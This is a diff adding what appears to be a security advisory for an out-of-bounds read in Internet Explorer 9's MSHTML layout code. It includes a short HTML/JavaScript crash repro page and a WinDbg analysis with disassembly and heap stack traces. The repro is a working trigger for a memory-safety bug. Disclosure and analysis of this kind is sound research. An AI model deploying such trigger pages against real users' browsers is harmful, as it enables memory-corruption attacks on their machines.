@@ -1,0 +1,150 @@
+1407G - MSIE9 MSHTML CPtsTextParaclient::CountApes OOB read
+=====================================
+
+Synopsis
+--------
+A malicious webpage can cause the CPtsTextParaclient::CountApes method to read
+OOB data.
+
+Known affected versions
+-----------------------
+  + MSIE 9
+
+Attack vectors
+--------------
+  * MSIE 9
+    
+    An attacker would need to get a target user to open a specially crafted
+    webpage.
+
+Mitigations
+-----------
+  * MSIE 9
+    
+    Disabling JavaScript should prevent an attacker from triggering the
+    vulnerable code path.
+
+Repro
+-----
+<!DOCTYPE html>
+<html>
+  <head>
+    <style type="text/css">
+      oElement1 {
+        position: absolute;
+      }
+      oElement2:after {
+        position: relative;
+        content: counter(x);
+      }
+    </style>
+    <script type="text/javascript">
+    window.onload = function () {
+      
+      oElement1 = document.createElement('oElement1');
+      document.documentElement.appendChild(oElement1);
+      
+      oElement2 = document.createElement('oElement2');
+      document.documentElement.appendChild(oElement2);
+    };
+    
+    </script>
+  </head>
+</html>
+(Please note that the repro must be loaded in an iframe from another webpage.)
+
+Description
+-----------
+After adding two elements with specific style properties during the onload
+event handler, MSIE refreshes the layout, at which point the "content" style
+causes it to update a counter. A call is made to "CPtsTextParaclient::CountApes"
+
+MSHTML!CPtsTextParaclient::CountApes:
+    mov     edi,edi
+    push    ebp
+    mov     ebp,esp
+    sub     esp,8
+    push    ebx
+    mov     ebx,dword ptr [eax+20h]
+    push    esi
+    lea     ecx,[eax+24h]
+    push    edi
+    mov     dword ptr [ebp-8],ecx
+    mov     dword ptr [ebp-4],0
+    test    ebx,ebx
+    je      MSHTML!CPtsTextParaclient::CountApes+0x1b7
+    cmp     ebx,dword ptr [ebp-8]
+    je      MSHTML!CPtsTextParaclient::CountApes+0x1b3
+    mov     eax,dword ptr [ebx]  ds:0023:dcbabbbb=????????
+
+This crash happens with page heap enabled and the value in ebx is a marker used
+by page heap. The above disassembly shows that the value in ebx is taken from
+eax+20, and that eax was passed to it by its caller. We can get more information
+about the memory at eax:
+
+1:020> !heap -p -a @eax
+    address 0b00efb4 found in
+    _DPH_HEAP_ROOT @ 51000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                                 af126e8:          b00efd8               24 -          b00e000             2000
+    71908e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
+    77c15ede ntdll!RtlDebugAllocateHeap+0x00000030
+    77bda40a ntdll!RtlpAllocateHeap+0x000000c4
+    77ba5ae0 ntdll!RtlAllocateHeap+0x0000023a
+    683928a3 MSHTML!CGeneratedTreeNode::InitBeginPos+0x00000016
+    683926b4 MSHTML!CGeneratedContent::InsertOneNode+0x00000044
+    6839264d MSHTML!CGeneratedContent::CreateNode+0x000000b8
+    68392be1 MSHTML!CGeneratedContent::CreateContent+0x000000d6
+    68392b0b MSHTML!CGeneratedContent::ApplyContentExpressionCore+0x00000109
+    681a397c MSHTML!CElement::ComputeFormatsVirtual+0x000021c9
+    682e9421 MSHTML!CElement::ComputeFormats+0x000000f1
+    682e9340 MSHTML!CTreeNode::ComputeFormats+0x000000ba
+    682eabb8 MSHTML!CTreeNode::ComputeFormatsHelper+0x00000040
+    682f1a63 MSHTML!CTreeNode::GetFancyFormat+0x00000032
+    682f6b22 MSHTML!CLayoutBlock::GetDisplayAndPosition+0x00000052
+    682f7853 MSHTML!CLayoutBlock::IdentifyBlock+0x00000050
+    6834c390 MSHTML!CTextBlock::IdentifyRunTypeToBuild+0x000000fd
+    6834d1d0 MSHTML!CTextBlock::GetNextPosForBidi+0x00000102
+    6834c45b MSHTML!CTextBlock::SBlockBuildingState::CTextBlockBidiData::GetNextRun+0x00000046
+    683451d0 MSHTML!SBidiAnalysis::CheckIfBidiAnalysisIsNeeded+0x00000069
+    6834bdc2 MSHTML!CTextBlock::SBlockBuildingState::SetToTextBlock+0x00000077
+    6834c93a MSHTML!CTextBlock::BuildTextBlock+0x000002de
+    6834ba66 MSHTML!CLayoutBlock::BuildBlock+0x000003ef
+    682f75cb MSHTML!CBlockContainerBlock::BuildBlockContainer+0x0000090d
+    682f7cb2 MSHTML!CLayoutBlock::BuildBlock+0x000002e8
+    682f75cb MSHTML!CBlockContainerBlock::BuildBlockContainer+0x0000090d
+    682f7cb2 MSHTML!CLayoutBlock::BuildBlock+0x000002e8
+    682f7e35 MSHTML!CCssDocumentLayout::GetPage+0x00000723
+    680f4bb0 MSHTML!CHtmlPageLayout::CalcSizeVirtual+0x00000478
+    6832e825 MSHTML!CLayout::CalcSize+0x000005a0
+    683c4002 MSHTML!CLayout::DoLayout+0x0000024b
+    6856e37d MSHTML!CView::ExecuteLayoutTasks+0x0000003b
+
+In short: eax points 0x24 bytes before the start of valid allocated memory! It
+appears that the caller is providing a bad pointer. Unfortunately, the memory
+does not start with a vftable, so it's not easy to identify the exact type of
+the data stored in the memory.
+
+Looking at the caller, CPtsTextParaclient::GetNumberApeCorners, it appears to
+loop through some data structures. The call to CPtsTextParaclient::CountApes is
+made in the third loop.
+
+MSHTML!CPtsTextParaclient::GetNumberApeCorners+0x103
+    mov     ecx,dword ptr [esi+0Ch]
+    mov     eax,dword ptr [ecx]
+    and     eax,1
+    lea     edx,[ebp+0Ch]
+    lea     eax,[eax+eax*2]
+    push    edx
+    lea     eax,[ecx+eax*8-24h]
+    call    MSHTML!CPtsTextParaclient::CountApes
+
+This code uses a memory structure (pointer stored in esi) to find a second
+structure (pointer stored in ecx). It reads a flag in eax and multiplies it
+by 24 (*3*8), then subtracts 24. It then adds the pointer in ecx to this value.
+The result can be only two values: ecx-24 or ecx. The former causes this issues.
+
+This code seems to make no sense; assuming ecx points to the start of a
+structure and thus a memory allocation, the ecx-24 result is always invalid.
+Further analysis is needed to determine root cause, for which I unfortunately
+do not have the time a this point.
